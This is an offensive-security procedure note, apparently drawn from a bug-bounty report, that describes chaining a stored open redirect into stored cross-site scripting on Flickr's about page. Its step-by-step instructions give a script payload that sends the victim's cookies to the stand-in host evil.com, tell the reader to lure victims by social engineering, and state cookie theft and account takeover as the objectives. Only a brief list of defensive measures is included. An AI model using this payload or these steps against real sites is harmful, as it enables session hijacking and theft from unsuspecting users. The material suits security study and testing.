---
tags:
  - xss
  - html-parsing
  - chained-vulnerability
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:30.756Z'
sub_techniques: []
id: d345a16b-ee90-4cd0-9fa8-a1ac5089768f
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-via-HTML-Parsing-Bug

## Summary

This procedure chains the stored open redirect to exploit an underlying HTML parsing bug in Flickr's about page, allowing JavaScript execution in the victim's browser context for data exfiltration or session manipulation.

## Description

Upon investigating the open redirect, a flaw in the HTML parsing logic was uncovered, where user-supplied input in redirect URLs is not properly escaped, enabling XSS. For example, injecting `<script>alert(document.cookie)</script>` within the redirect parameter causes the parser to interpret it as executable HTML/JS during page rendering. This stored XSS affects all viewers of the about page, with medium impact including potential account takeover. Reported via HackerOne, it highlights how redirect vulns can reveal deeper issues.

## Requirements

1. Successful exploitation of the open redirect (prior procedure)
2. Knowledge of JavaScript payloads
3. Victim access to the affected about page

## Defense

Defensive measures and detection strategies:

- Apply strict input sanitization and output encoding (e.g., HTML entity encoding)
- Use secure parsing libraries that handle edge cases
- Implement XSS filters and CSP headers
- Audit redirect implementations for parsing flaws

## Objectives

1. Inject XSS payload via the redirect mechanism
2. Execute arbitrary JavaScript on page load
3. Steal sensitive data like cookies or perform actions on behalf of the victim

## Instructions

### Step 1: Craft XSS Payload

**Context**: Modify the stored redirect input to include executable HTML/JS.

In the about page input, embed a payload like: `Redirect to <script>fetch('https://evil.com?cookie='+document.cookie)</script>`.

Submit and store it, ensuring the parser will process the tags.

### Step 2: Trigger Page Load

**Context**: Have a victim (or test account) view the about page.

Share the about page link via social engineering or direct access. Upon loading, the parsing bug executes the script.

### Step 3: Verify Execution

**Context**: Confirm XSS in the browser.

Open DevTools console on the victim's side. Look for alert, network requests to attacker server, or console errors indicating script run.

**Expected Output**: JavaScript executes, e.g., data sent to attacker-controlled endpoint.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- javascript
- parsing-bug
